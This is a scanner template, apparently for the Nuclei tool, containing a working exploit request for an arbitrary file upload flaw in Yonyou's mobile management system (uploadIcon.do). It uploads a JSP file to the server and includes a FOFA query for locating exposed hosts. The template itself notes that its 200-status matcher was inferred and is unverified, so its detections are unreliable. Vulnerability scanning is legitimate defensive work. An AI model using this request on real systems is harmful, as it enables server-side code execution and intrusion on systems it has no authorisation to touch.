id: poc-044dbae3df94d8577726
info:
  name: 用友移动管理系统uploadIcon.do任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/044dbae3df94d8577726b3f676306cef

    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: 044dbae3df94d8577726b3f676306cef
    fofa: + fofa：`app="用友-移动系统管理"`
http:
- raw:
  - 'POST /maportal/appmanager/uploadIcon.do HTTP/1.1

    Content-Type: multipart/form-data; boundary=00content0boundary00

    User-Agent: Java/1.8.0_381

    Host: {{Hostname}}

    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

    Content-Length: 142

    Connection: close


    --00content0boundary00

    Content-Disposition: form-data; name="iconFile"; filename="1.jsp"


    <% out.print(123); %>

    --00content0boundary00--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
